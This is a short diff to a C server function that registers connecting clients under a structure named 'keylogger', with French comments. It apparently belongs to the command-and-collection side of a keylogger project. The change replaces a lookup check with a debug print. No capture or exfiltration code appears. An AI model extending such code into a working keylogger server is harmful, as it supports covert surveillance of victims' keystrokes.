@@ -106,8 +106,8 @@ void server(struct sockaddr_in *addr, struct data *d) {
 	  strcat(name_client, itoa(d->num_client));
 	  
 	  //creation du client au moment de la connexion au serveur
-	  if(research_clients(d->keylogger, d->num_client) == 1)
-	    create_clients(d->keylogger, inet_ntoa(addr[i].sin_addr), name_client);
+	  printf("num_client %d\n", d->num_client);
+	  create_clients(d->keylogger, inet_ntoa(addr[i].sin_addr), name_client);
 
 	  fds[reuse].fd = new_fd;
           fds[reuse].events = POLLIN;
